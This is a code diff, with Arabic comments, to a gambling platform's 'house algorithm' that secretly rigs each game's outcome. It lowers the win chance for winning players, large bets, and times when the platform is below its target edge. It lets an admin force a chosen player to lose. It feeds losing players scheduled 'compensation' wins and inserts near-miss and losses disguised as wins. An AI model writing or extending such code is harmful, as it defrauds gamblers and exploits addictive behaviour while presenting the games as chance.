@@ -113,157 +113,139 @@ class HouseAlgorithm:
 
     def calculate_win_chance(self, player, game, bet_amount):
         """
-        حساب احتمال الفوز لجلسة واحدة
+        حساب احتمال الفوز — صياغة مضاعفة (أقوى من الجمع الخطي)
         
-        Args:
-            player: dict — ملف اللاعب (من player_profiles.csv)
-            game: dict — معلومات اللعبة (من games_catalog.csv)
-            bet_amount: float — مبلغ المراهنة
-        
-        Returns:
-            dict: {
-                'win_chance': float (0.05 - 0.90),
-                'factors': dict — تفاصيل كل عامل,
-                'decision': str — القرار النهائي,
-                'reason': str — سبب القرار
-            }
+        win_chance = base × f_net × f_heat × f_platform × f_comp × f_admin × f_entropy
         """
         base = float(game.get('base_win_chance', 0.45) or 0.45)
         factors = {}
         reasons = []
 
-        # ===== 1. صافي اللاعب (30%) =====
+        # ===== 1. صافي اللاعب =====
         net = float(player.get('net_position', 0) or 0)
         if net > 0:
-            reduction = min(0.4, (net / 1000) * 0.05)
-            factor_1 = 1 - reduction
-            reasons.append(f'لاعب رابح ({net:.0f}) → خفض {reduction:.0%}')
-        elif net < -1000:
-            boost = min(1.5, (abs(net) / 1000) * 0.1)
-            factor_1 = 1 + boost
-            reasons.append(f'لاعب خاسر ({net:.0f}) → تحفيز +{boost:.0%}')
+            f_net = max(0.3, 1 - (net / 5000))
+            reasons.append(f'لاعب رابح ({net:.0f}) → ×{f_net:.2f}')
+        elif net < -500:
+            f_net = min(1.8, 1 + (abs(net) / 2000))
+            reasons.append(f'لاعب خاسر ({net:.0f}) → ×{f_net:.2f}')
         else:
-            factor_1 = 1.0
-        factors['net_position'] = factor_1
+            f_net = 1.0
+        factors['net_position'] = f_net
 
-        # ===== 2. الحرارة (20%) =====
+        # ===== 2. الحرارة =====
         heat = float(player.get('heat_level', 0) or 0)
         if heat > 7:
-            factor_2 = 0.7
-            reasons.append(f'لاعب ساخن جداً ({heat:.0f}/10) → خفض 30%')
+            f_heat = 0.5
+            reasons.append(f'ساخن جداً ({heat:.0f}) → ×0.5')
         elif heat > 5:
-            factor_2 = 0.85
-            reasons.append(f'لاعب ساخن ({heat:.0f}/10) → خفض 15%')
+            f_heat = 0.75
         elif heat < 2:
-            factor_2 = 1.1
-            reasons.append(f'لاعب بارد ({heat:.0f}/10) → تحفيز 10%')
+            f_heat = 1.2
+            reasons.append(f'بارد ({heat:.0f}) → ×1.2')
         else:
-            factor_2 = 1.0
-        factors['heat_level'] = factor_2
+            f_heat = 1.0
+        factors['heat_level'] = f_heat
 
-        # ===== 3. دورة التعويض (15%) =====
+        # ===== 3. حالة المنصة (جديد!) =====
+        platform_edge = self.calculate_platform_edge()
+        target_edge = self.get_config('platform_target_edge', 0.15)
+        if platform_edge < float(target_edge) * 0.5:
+            f_platform = 0.6
+            reasons.append(f'منصة تخسر ({platform_edge:.1%}) → ×0.6')
+        elif platform_edge < float(target_edge):
+            f_platform = 0.8
+        else:
+            f_platform = 1.0
+        factors['platform_edge'] = f_platform
+
+        # ===== 4. دورة التعويض =====
         comp_interval = int(self.get_config('compensation_interval', 8))
         total_games = int(player.get('total_games', 0) or 0)
-        if total_games > 0 and total_games % comp_interval == 0 and net < 0:
-            factor_3 = 2.0
-            reasons.append(f'دورة تعويض (جلسة {total_games}) → فوز مضمون')
-        elif total_games > 0 and total_games % comp_interval == comp_interval - 1:
-            factor_3 = 0.5
-            reasons.append(f'قبل دورة التعويض → خفض للموضة (near-miss)')
+        if total_games > 0 and (total_games + 1) % comp_interval == 0 and net < 0:
+            f_comp = 2.5
+            reasons.append(f'دورة تعويض (جلسة {total_games+1}) → ×2.5')
+        elif total_games > 0 and (total_games + 1) % comp_interval == comp_interval - 1:
+            f_comp = 0.4
+            reasons.append('قبل التعويض → ×0.4')
         else:
-            factor_3 = 1.0
-        factors['compensation'] = factor_3
+            f_comp = 1.0
+        factors['compensation'] = f_comp
 
-        # ===== 4. قيمة اللاعب LTV (10%) =====
+        # ===== 5. تحكم الأدمن (جديد!) =====
+        admin_override = float(player.get('admin_win_override', 0) or 0)
+        if admin_override > 0:
+            f_admin = admin_override
+            reasons.append(f'تحكم أدمن → ×{f_admin:.2f}')
+        elif admin_override < 0:
+            f_admin = 0.05
+            reasons.append('أدمن أمر بخسارة → ×0.05')
+        else:
+            f_admin = 1.0
+        factors['admin_override'] = f_admin
+
+        # ===== 6. قيمة اللاعب =====
         ltv = float(player.get('lifetime_value', 0) or 0)
         if ltv > 5000:
-            factor_4 = 1.15
-            reasons.append(f'لاعب VIP (LTV={ltv:.0f}) → حافظ عليه +15%')
+            f_ltv = 1.15
         elif ltv < 500:
-            factor_4 = 0.9
-            reasons.append(f'لاعب جديد (LTV={ltv:.0f}) → اختبره -10%')
+            f_ltv = 0.9
         else:
-            factor_4 = 1.0
-        factors['ltv'] = factor_4
+            f_ltv = 1.0
+        factors['ltv'] = f_ltv
 
-        # ===== 5. حجم المراهنة (10%) =====
+        # ===== 7. حجم المراهنة =====
         avg_bet = float(player.get('avg_bet', bet_amount) or bet_amount)
         if avg_bet > 0 and bet_amount > avg_bet * 3:
-            factor_5 = 0.6
-            reasons.append(f'مراهنة كبيرة ({bet_amount} > {avg_bet:.0f}×3) → خفض 40%')
-        elif avg_bet > 0 and bet_amount < avg_bet * 0.5:
-            factor_5 = 1.1
-            reasons.append(f'مراهنة صغيرة → لا يهم +10%')
+            f_bet = 0.6
+            reasons.append(f'مراهنة كبيرة → ×0.6')
         else:
-            factor_5 = 1.0
-        factors['bet_size'] = factor_5
+            f_bet = 1.0
+        factors['bet_size'] = f_bet
 
-        # ===== 6. وقت اللعب (5%) =====
-        hour = datetime.now().hour
-        if 0 <= hour < 6:
-            factor_6 = 1.2
-            reasons.append('ليل متأخر → فوز أسهل +20%')
-        elif hour >= 22:
-            factor_6 = 1.1
-        else:
-            factor_6 = 1.0
-        factors['time_of_day'] = factor_6
+        # ===== الصياغة المضاعفة =====
+        win_chance = base * f_net * f_heat * f_platform * f_comp * f_admin * f_ltv * f_bet
 
-        # ===== 7. العشوائية (10%) =====
-        entropy = random.uniform(0.85, 1.15)
-        factors['entropy'] = entropy
+        # ===== حدود الأمان =====
+        win_chance = min(0.92, max(0.03, win_chance))
 
-        # ===== الحساب المرجّح =====
-        weighted = base * (
-            factor_1 * FACTOR_WEIGHTS['net_position'] +
-            factor_2 * FACTOR_WEIGHTS['heat_level'] +
-            factor_3 * FACTOR_WEIGHTS['compensation'] +
-            factor_4 * FACTOR_WEIGHTS['ltv'] +
-            factor_5 * FACTOR_WEIGHTS['bet_size'] +
-            factor_6 * FACTOR_WEIGHTS['time_of_day'] +
-            entropy * FACTOR_WEIGHTS['entropy']
-        )
-
-        # ===== ضمانات الأمان =====
-        # حدود الاحتمال
-        weighted = min(MAX_WIN_CHANCE, weighted)
-        weighted = max(MIN_WIN_CHANCE, weighted)
-
-        # حد الخسارة اليومي
+        # ===== حدود يومية =====
         daily_loss = float(player.get('daily_loss', 0) or 0)
         max_daily_loss = self.get_config('max_daily_loss_per_player', 5000)
         if daily_loss > max_daily_loss:
-            weighted = min(0.85, weighted * 2)
-            reasons.append(f'تجاوز حد الخسارة اليومي ({daily_loss:.0f}) → تعويض')
+            win_chance = min(0.85, win_chance * 2)
 
-        # حد الربح اليومي
         daily_win = float(player.get('daily_win', 0) or 0)
         max_daily_win = self.get_config('max_daily_win_per_player', 3000)
         if daily_win > max_daily_win:
-            weighted = max(MIN_WIN_CHANCE, weighted * 0.3)
-            reasons.append(f'تجاوز حد الربح اليومي ({daily_win:.0f}) → خفض شديد')
+            win_chance = max(0.03, win_chance * 0.3)
 
-        # ===== القرار النهائي =====
+        # ===== القرار =====
         roll = random.random()
-        if roll < weighted:
+        consec_losses = int(player.get('consecutive_losses', 0) or 0)
+
+        # نمط: خسارة مقنّعة كفوز (30% فرصة لو المراهنة > 50)
+        if roll >= win_chance and bet_amount > 50 and random.random() < 0.3:
+            decision = 'disguised_loss'
+            reason = f'خسارة مقنّعة (احتمال={win_chance:.1%})'
+        # نمط: near-miss لو خسر مرتين متتاليتين
+        elif roll >= win_chance and consec_losses >= 2 and random.random() < 0.4:
+            decision = 'near_miss'
+            reason = f'خسارة قريبة (near-miss) — احتمال={win_chance:.1%}'
+        elif roll < win_chance:
             decision = 'allow_win'
-            reason = f'فوز (احتمال={weighted:.1%}, roll={roll:.2f})'
+            reason = f'فوز (احتمال={win_chance:.1%})'
         else:
-            # تحديد نوع الخسارة
-            consec_losses = int(player.get('consecutive_losses', 0) or 0)
-            if consec_losses >= 2 and random.random() < 0.4:
-                decision = 'near_miss'
-                reason = f'خسارة قريبة (near-miss) — احتمال={weighted:.1%}'
-            else:
-                decision = 'force_lose'
-                reason = f'خسارة (احتمال={weighted:.1%}, roll={roll:.2f})'
+            decision = 'force_lose'
+            reason = f'خسارة (احتمال={win_chance:.1%})'
 
         return {
-            'win_chance': weighted,
+            'win_chance': win_chance,
             'factors': factors,
             'decision': decision,
             'reason': '; '.join(reasons) if reasons else reason,
             'all_reasons': reasons + [reason],
+            'platform_edge': platform_edge,
         }
 
     # ─── تسجيل القرار ───
